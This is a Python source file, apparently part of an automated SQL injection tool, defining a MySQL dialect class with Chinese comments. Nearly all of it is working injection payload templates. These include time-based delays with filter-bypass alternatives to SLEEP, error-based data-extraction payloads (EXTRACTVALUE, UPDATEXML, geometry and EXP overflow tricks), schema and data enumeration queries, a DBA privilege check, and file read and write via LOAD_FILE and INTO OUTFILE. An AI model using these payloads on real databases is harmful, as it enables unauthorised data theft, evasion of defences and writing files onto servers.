# -*- coding: utf-8 -*-
"""MySQL 方言（v1.1：补齐关键词被禁时的替代写法）"""
from dbms.base import BaseDialect


class MySQLDialect(BaseDialect):
    name = "mysql"

    def version_expr(self): return "VERSION()"
    def database_expr(self): return "DATABASE()"
    def current_user_expr(self): return "CURRENT_USER()"
    def is_dba_expr(self): return "(SELECT SUPER_PRIV FROM mysql.user WHERE user=CURRENT_USER() LIMIT 0,1)"

    def tables_query(self, db_name, idx):
        if db_name:
            return (f"SELECT table_name FROM information_schema.tables "
                    f"WHERE table_schema='{db_name}' LIMIT {idx},1")
        return (f"SELECT table_name FROM information_schema.tables "
                f"WHERE table_schema=DATABASE() LIMIT {idx},1")

    def columns_query(self, table_name, db_name, idx):
        if db_name:
            return (f"SELECT column_name FROM information_schema.columns "
                    f"WHERE table_schema='{db_name}' AND table_name='{table_name}' LIMIT {idx},1")
        return (f"SELECT column_name FROM information_schema.columns "
                f"WHERE table_schema=DATABASE() AND table_name='{table_name}' LIMIT {idx},1")

    def column_types_query(self, table_name, db_name, idx):
        if db_name:
            return (f"SELECT data_type FROM information_schema.columns "
                    f"WHERE table_schema='{db_name}' AND table_name='{table_name}' LIMIT {idx},1")
        return (f"SELECT data_type FROM information_schema.columns "
                f"WHERE table_schema=DATABASE() AND table_name='{table_name}' LIMIT {idx},1")

    def data_query(self, table_name, column, idx):
        return f"SELECT {column} FROM {table_name} LIMIT {idx},1"

    # ---------------- 长度 / 截取 / 取码 变体 ----------------
    def length_templates(self):
        return ["LENGTH(({sql}))", "CHAR_LENGTH(({sql}))"]

    def substr_templates(self):
        return ["SUBSTR(({sql}),{pos},{len})",
                "MID(({sql}),{pos},{len})",
                "SUBSTRING(({sql}),{pos},{len})"]

    def ascii_templates(self):
        return ["ASCII(({sql}))", "ORD(({sql}))"]

    # ---------------- 延时：sleep 被禁时的替代 ----------------
    def sleep_expr(self, seconds):
        return f"SLEEP({seconds})"

    def sleep_expr_variants(self, seconds):
        return [
            f"SLEEP({seconds})",
            f"(SELECT SLEEP({seconds}))",
            f"BENCHMARK(10000000,MD5(1))",
            f"GET_LOCK(0x61,{seconds})",
            # 全表笛卡尔重查询：不依赖任何被禁函数，靠计算量制造延时
            (f"(SELECT COUNT(*) FROM information_schema.columns A,"
             f"information_schema.columns B,information_schema.columns C)"),
            (f"(SELECT COUNT(*) FROM information_schema.columns A,"
             f"information_schema.columns B,information_schema.columns C,"
             f"information_schema.columns D)"),
        ]

    # ---------------- 报错：extractvalue/updatexml 被禁时的替代 ----------------
    def error_payloads(self, inner):
        return [
            f"EXTRACTVALUE(1,CONCAT(0x7e,{inner},0x7e))",
            f"UPDATEXML(1,CONCAT(0x7e,{inner},0x7e),1)",
            f"(SELECT 1 FROM (SELECT COUNT(*),CONCAT({inner},FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
            f"GTID_SUBSET(CONCAT(0x7e,{inner},0x7e),1)",
            # 几何函数簇：value 无法转几何 → 报错信息里回显内容
            f"MULTIPOINT({inner})",
            f"POLYGON({inner})",
            f"LINESTRING({inner})",
            f"GEOMETRYCOLLECTION({inner})",
            # exp 溢出
            f"EXP(~(SELECT * FROM(SELECT {inner})a))",
            # 5.7+ JSON 非法报错
            f"JSON_KEYS({inner})",
            # 5.x 常量表达式重复列名
            f"(SELECT * FROM (SELECT 1,{inner})x GROUP BY 1 HAVING {inner})",
        ]

    def error_fingerprints(self):
        return [
            "EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))",
            "UPDATEXML(1,CONCAT(0x7e,VERSION(),0x7e),1)",
            "(SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
            "GTID_SUBSET(CONCAT(0x7e,VERSION(),0x7e),1)",
        ]

    def error_keywords(self):
        return ["XPATH", "MySQL", "MariaDB", "Duplicate entry",
                "Cannot get geometry object", "DOUBLE value is out of range",
                "Invalid JSON"]

    def boolean_fingerprints(self):
        # 只留「本 DBMS 独有」的判据：information_schema 在别的库上直接报错。
        # （原来还挂了一条 `(SELECT 1)=1` —— 它在任何库上都成立，不具区分度，
        #   只会让字典里第一个参检的方言永远命中。）
        return ["(SELECT COUNT(*) FROM information_schema.tables)>0"]

    def file_read_expr(self, path):
        return f"LOAD_FILE('{path}')"

    def file_write_expr(self, path, content):
        return f"SELECT '{content}' INTO OUTFILE '{path}'"
